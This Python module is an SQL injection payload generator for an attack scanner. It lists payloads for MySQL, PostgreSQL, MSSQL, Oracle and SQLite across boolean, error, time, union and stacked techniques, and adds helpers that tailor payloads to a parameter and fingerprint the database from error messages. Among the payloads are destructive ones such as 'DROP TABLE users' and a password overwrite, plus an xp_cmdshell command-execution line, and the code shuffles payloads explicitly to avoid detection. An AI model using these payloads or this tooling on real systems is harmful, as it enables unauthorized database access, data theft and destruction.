"""
SQL injection payloads database.
Organized by database type and injection technique.
"""
from enum import Enum
from typing import Dict, List, Optional
import random

class DatabaseType(Enum):
    """Supported database types"""
    GENERIC = "generic"
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"

class InjectionType(Enum):
    """SQL injection types"""
    BOOLEAN = "boolean"
    ERROR = "error"
    TIME = "time"
    UNION = "union"
    STACKED = "stacked"

class SQLPayloadGenerator:
    """Generates SQL injection payloads"""
    
    def __init__(self):
        self.payloads = self._initialize_payloads()
    
    def _initialize_payloads(self) -> Dict[DatabaseType, Dict[InjectionType, List[str]]]:
        """Initialize payload database"""
        
        payloads = {}
        
        # Generic payloads (work across most databases)
        generic_payloads = {
            InjectionType.BOOLEAN: [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' #",
                "\" OR \"1\"=\"1",
                "' OR 'a'='a",
                "' OR 1=1 --",
                "' OR 1=1 #",
                "' OR 1=1/*",
                "' OR 'x'='x",
                "' OR 'a'<>'b",
                "') OR ('1'='1",
                "' OR 1 --",
                "' OR '1'='1'/*",
            ],
            InjectionType.ERROR: [
                "'",
                "\"",
                "`",
                "'\"",
                "\"'",
                "')",
                "\")",
                "`)",
                "';",
                "\";",
                "`;",
                "'--",
                "\"--",
                "'/*",
                "\"/*",
                "' OR 1=CONVERT(int, @@version) --",
            ],
            InjectionType.TIME: [
                "' OR SLEEP(5) --",
                "\" OR SLEEP(5) --",
                "' OR BENCHMARK(1000000, MD5('test')) --",
                "\" OR BENCHMARK(1000000, MD5('test')) --",
                "' OR pg_sleep(5) --",
                "\" OR pg_sleep(5) --",
                "' OR WAITFOR DELAY '00:00:05' --",
                "\" OR WAITFOR DELAY '00:00:05' --",
            ],
            InjectionType.UNION: [
                "' UNION SELECT NULL --",
                "\" UNION SELECT NULL --",
                "' UNION SELECT NULL, NULL --",
                "\" UNION SELECT NULL, NULL --",
                "' UNION SELECT 1 --",
                "\" UNION SELECT 1 --",
                "' UNION SELECT 1,2 --",
                "\" UNION SELECT 1,2 --",
                "' UNION SELECT @@version --",
                "\" UNION SELECT @@version --",
            ],
            InjectionType.STACKED: [
                "'; SELECT SLEEP(5) --",
                "\"; SELECT SLEEP(5) --",
                "'; DROP TABLE users --",
                "\"; DROP TABLE users --",
                "'; UPDATE users SET password='hacked' --",
                "\"; UPDATE users SET password='hacked' --",
            ]
        }
        
        # MySQL-specific payloads
        mysql_payloads = {
            InjectionType.BOOLEAN: [
                "' OR 1=1 --",
                "' OR '1'='1' -- -",
                "' OR 1 #",
                "' OR 1=1 #",
                "admin' --",
                "admin' #",
                "' OR IF(1=1, true, false) --",
            ],
            InjectionType.ERROR: [
                "' AND extractvalue(1, concat(0x5c, version())) --",
                "' AND updatexml(1, concat(0x5c, version()), 1) --",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
                "' OR (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.TABLES GROUP BY x)a) --",
            ],
            InjectionType.TIME: [
                "' AND SLEEP(5) --",
                "' OR SLEEP(5) --",
                "' AND BENCHMARK(1000000, MD5('test')) --",
                "' OR BENCHMARK(1000000, MD5('test')) --",
                "' AND IF(1=1, SLEEP(5), 0) --",
                "' OR IF(1=1, SLEEP(5), 0) --",
            ],
            InjectionType.UNION: [
                "' UNION SELECT @@version, NULL --",
                "' UNION SELECT user(), database() --",
                "' UNION SELECT table_name, column_name FROM information_schema.columns --",
                "' UNION SELECT 1, GROUP_CONCAT(table_name) FROM information_schema.tables --",
            ],
            InjectionType.STACKED: [
                "'; SELECT SLEEP(5) --",
                "'; SHOW TABLES --",
                "'; SELECT * FROM users --",
                "'; INSERT INTO logs (message) VALUES ('hacked') --",
            ]
        }
        
        # PostgreSQL-specific payloads
        postgresql_payloads = {
            InjectionType.BOOLEAN: [
                "' OR 1=1 --",
                "' OR '1'='1' --",
                "' OR 1=1; --",
                "' OR 1::int = 1 --",
            ],
            InjectionType.ERROR: [
                "' OR CAST(version() AS INTEGER) --",
                "' AND 1=CAST(version() AS INTEGER) --",
                "' OR (SELECT 1/0) --",
            ],
            InjectionType.TIME: [
                "' OR pg_sleep(5) --",
                "' AND pg_sleep(5) --",
                "' OR (SELECT pg_sleep(5)) --",
            ],
            InjectionType.UNION: [
                "' UNION SELECT version(), NULL --",
                "' UNION SELECT current_user, current_database() --",
                "' UNION SELECT table_name, column_name FROM information_schema.columns --",
            ],
            InjectionType.STACKED: [
                "'; SELECT pg_sleep(5) --",
                "'; DROP TABLE users --",
            ]
        }
        
        # MSSQL-specific payloads
        mssql_payloads = {
            InjectionType.BOOLEAN: [
                "' OR 1=1 --",
                "' OR '1'='1' --",
                "' OR 1=1; --",
                "admin' --",
            ],
            InjectionType.ERROR: [
                "' OR 1=CONVERT(int, @@version) --",
                "' AND 1=CONVERT(int, @@version) --",
            ],
            InjectionType.TIME: [
                "' OR WAITFOR DELAY '00:00:05' --",
                "' AND WAITFOR DELAY '00:00:05' --",
            ],
            InjectionType.UNION: [
                "' UNION SELECT @@version, NULL --",
                "' UNION SELECT name FROM sys.databases --",
                "' UNION SELECT table_name, column_name FROM information_schema.columns --",
            ],
            InjectionType.STACKED: [
                "'; WAITFOR DELAY '00:00:05' --",
                "'; EXEC xp_cmdshell('dir') --",
            ]
        }
        
        # Oracle-specific payloads
        oracle_payloads = {
            InjectionType.BOOLEAN: [
                "' OR 1=1 --",
                "' OR '1'='1' --",
                "' OR 1=1 /*",
            ],
            InjectionType.ERROR: [
                "' OR (SELECT 1 FROM dual WHERE 1=1) --",
                "' AND (SELECT 1 FROM dual WHERE 1=1) --",
            ],
            InjectionType.TIME: [
                "' OR DBMS_LOCK.SLEEP(5) --",
                "' AND DBMS_LOCK.SLEEP(5) --",
            ],
            InjectionType.UNION: [
                "' UNION SELECT NULL FROM dual --",
                "' UNION SELECT banner FROM v$version --",
            ],
            InjectionType.STACKED: [
                "'; EXEC DBMS_LOCK.SLEEP(5) --",
            ]
        }
        
        # SQLite-specific payloads
        sqlite_payloads = {
            InjectionType.BOOLEAN: [
                "' OR 1=1 --",
                "' OR '1'='1' --",
            ],
            InjectionType.ERROR: [
                "' OR 1=load_extension('test') --",
            ],
            InjectionType.TIME: [
                "' OR randomblob(100000000) --",
            ],
            InjectionType.UNION: [
                "' UNION SELECT sqlite_version(), NULL --",
            ],
            InjectionType.STACKED: [
                "'; SELECT randomblob(100000000) --",
            ]
        }
        
        # Assign payloads to database types
        payloads[DatabaseType.GENERIC] = generic_payloads
        payloads[DatabaseType.MYSQL] = mysql_payloads
        payloads[DatabaseType.POSTGRESQL] = postgresql_payloads
        payloads[DatabaseType.MSSQL] = mssql_payloads
        payloads[DatabaseType.ORACLE] = oracle_payloads
        payloads[DatabaseType.SQLITE] = sqlite_payloads
        
        return payloads
    
    def get_payloads(self, 
                    db_type: DatabaseType = DatabaseType.GENERIC, 
                    injection_type: Optional[InjectionType] = None,
                    limit: Optional[int] = None) -> List[str]:
        """
        Get SQL injection payloads.
        
        Args:
            db_type: Database type
            injection_type: Specific injection type (None for all)
            limit: Maximum number of payloads to return
            
        Returns:
            List of payload strings
        """
        if db_type not in self.payloads:
            db_type = DatabaseType.GENERIC
        
        if injection_type:
            payloads = self.payloads[db_type].get(injection_type, [])
        else:
            # Combine all payload types
            payloads = []
            for payload_list in self.payloads[db_type].values():
                payloads.extend(payload_list)
        
        # Shuffle payloads to avoid pattern detection
        random.shuffle(payloads)
        
        if limit:
            payloads = payloads[:limit]
        
        return payloads
    
    def generate_contextual_payload(self, 
                                   original_value: str,
                                   db_type: DatabaseType = DatabaseType.GENERIC,
                                   injection_type: InjectionType = InjectionType.BOOLEAN) -> str:
        """
        Generate a payload that preserves the original value context.
        
        Args:
            original_value: Original parameter value
            db_type: Database type
            injection_type: Injection type
            
        Returns:
            Contextual payload
        """
        payloads = self.get_payloads(db_type, injection_type, limit=5)
        
        if not payloads:
            return original_value
        
        # Choose a random payload
        payload = random.choice(payloads)
        
        # If original value is numeric, adapt payload
        if original_value.isdigit():
            # For numeric parameters, remove quotes from payload
            payload = payload.replace("'", "").replace("\"", "")
        
        # Append payload to original value
        return f"{original_value}{payload}"
    
    def detect_database_type(self, response_text: str) -> DatabaseType:
        """
        Attempt to detect database type from error messages.
        
        Args:
            response_text: HTTP response text
            
        Returns:
            Detected database type
        """
        response_lower = response_text.lower()
        
        # MySQL detection
        mysql_indicators = [
            "mysql",
            "mysqli",
            "you have an error in your sql syntax",
            "warning: mysql",
            "mysql_fetch",
            "mysql_query",
            "mysql_connect",
        ]
        
        # PostgreSQL detection
        postgres_indicators = [
            "postgresql",
            "postgres",
            "pg_",
            "psql",
            "postgresql error",
        ]
        
        # MSSQL detection
        mssql_indicators = [
            "microsoft sql server",
            "sql server",
            "odbc sql server",
            "sqlserver",
            "system.data.sqlclient",
            "oledb provider for odbc",
        ]
        
        # Oracle detection
        oracle_indicators = [
            "oracle",
            "ora-",
            "pl/sql",
            "oracle error",
            "oracle database",
        ]
        
        # SQLite detection
        sqlite_indicators = [
            "sqlite",
            "sqlite3",
            "sqlite error",
        ]
        
        # Check for each database
        for indicator in mysql_indicators:
            if indicator in response_lower:
                return DatabaseType.MYSQL
        
        for indicator in postgres_indicators:
            if indicator in response_lower:
                return DatabaseType.POSTGRESQL
        
        for indicator in mssql_indicators:
            if indicator in response_lower:
                return DatabaseType.MSSQL
        
        for indicator in oracle_indicators:
            if indicator in response_lower:
                return DatabaseType.ORACLE
        
        for indicator in sqlite_indicators:
            if indicator in response_lower:
                return DatabaseType.SQLITE
        
        return DatabaseType.GENERIC

# Global instance
payload_generator = SQLPayloadGenerator()